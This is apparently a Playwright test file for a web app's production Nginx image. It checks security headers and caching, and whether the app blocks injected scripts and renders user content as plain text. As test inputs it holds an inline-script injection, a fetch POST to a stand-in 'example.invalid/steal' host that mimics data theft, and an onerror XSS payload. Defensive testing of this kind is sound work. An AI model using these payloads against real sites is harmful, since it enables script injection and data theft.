import { test, expect } from "@playwright/test";

test.describe("production image security", () => {
  test.skip(!process.env.E2E_PRODUCTION, "Requires the actual Nginx image");

  test("entry, assets, errors and API carry safe cache and security headers", async ({
    request,
  }) => {
    const response = await request.get("/messages/2");
    expect(response.status()).toBe(200);
    const headers = response.headers();
    expect(headers["cache-control"]).toBe("no-store");
    expect(headers["x-content-type-options"]).toBe("nosniff");
    expect(headers["x-frame-options"]).toBe("DENY");
    expect(headers["referrer-policy"]).toBe("no-referrer");
    expect(headers["permissions-policy"]).toContain("camera=()");
    expect(headers["server"]).toBe("nginx");
    expect(headers["content-security-policy"]).toContain("script-src 'self'");
    expect(headers["content-security-policy"]).not.toContain("unsafe-eval");
    const entry = await response.text();
    const asset = entry.match(/src="([^"]+\.js)"/)?.[1];
    expect(asset).toBeTruthy();
    const chunk = await request.get(asset!);
    expect(chunk.status()).toBe(200);
    expect(chunk.headers()["cache-control"]).toContain("immutable");
    expect(chunk.headers()["content-security-policy"]).toBe(
      headers["content-security-policy"],
    );
    const missing = await request.get("/assets/no-such-chunk.js");
    expect(missing.status()).toBe(404);
    expect(missing.headers()["cache-control"]).not.toContain("immutable");
    expect(missing.headers()["x-content-type-options"]).toBe("nosniff");
    const api = await request.get("/api/healthz");
    expect(await api.json()).toEqual({ status: "ok" });
    expect(api.headers()["cache-control"]).toBe("no-store");
    expect(api.headers()["content-security-policy"]).toBe(
      headers["content-security-policy"],
    );
  });

  test("rejects injected inline scripts and off-origin credential requests", async ({
    page,
  }) => {
    await page.addInitScript(() => {
      const policyBlocks: { directive: string; uri: string }[] = [];
      Object.assign(window, { policyBlocks });
      document.addEventListener("securitypolicyviolation", (event) =>
        policyBlocks.push({
          directive: event.effectiveDirective,
          uri: event.blockedURI,
        }),
      );
    });
    await page.route("**/api/feed/**", (route) =>
      route.fulfill({ json: { video_list: [], has_more: false } }),
    );
    await page.goto("/");
    const result = await page.evaluate(async () => {
      const script = document.createElement("script");
      script.textContent = "window.injected = true";
      document.head.append(script);
      let blocked = false;
      try {
        await fetch("https://example.invalid/steal", {
          method: "POST",
          body: "synthetic",
        });
      } catch {
        blocked = true;
      }
      return {
        injected: Boolean(
          (window as unknown as { injected?: boolean }).injected,
        ),
        blocked,
      };
    });
    expect(result).toEqual({ injected: false, blocked: true });
    await expect
      .poll(() =>
        page.evaluate(() => {
          const blocks = (
            window as unknown as {
              policyBlocks: { directive: string; uri: string }[];
            }
          ).policyBlocks;
          return (
            blocks.some(
              (b) =>
                b.directive === "connect-src" &&
                b.uri.startsWith("https://example.invalid"),
            ) &&
            blocks.some(
              (b) => b.directive.startsWith("script-src") && b.uri === "inline",
            )
          );
        }),
      )
      .toBe(true);
  });

  test("renders user content as text on the production build", async ({
    page,
  }) => {
    const title = '<img src=x onerror="window.injected=true">';
    await page.route("**/api/feed/**", (route) =>
      route.fulfill({
        json: {
          video_list: [
            {
              id: 1,
              author: { id: 2, username: "viewer" },
              title,
              play_url: "/static/clip.mp4",
              cover_url: "",
              likes_count: 0,
              is_liked: false,
            },
          ],
          has_more: false,
        },
      }),
    );
    await page.goto("/");
    await expect(
      page.getByRole("heading", { name: title, exact: true }),
    ).toBeVisible();
    expect(await page.locator("[onerror]").count()).toBe(0);
    expect(
      await page.evaluate(() =>
        Boolean((window as unknown as { injected?: boolean }).injected),
      ),
    ).toBe(false);
  });
});
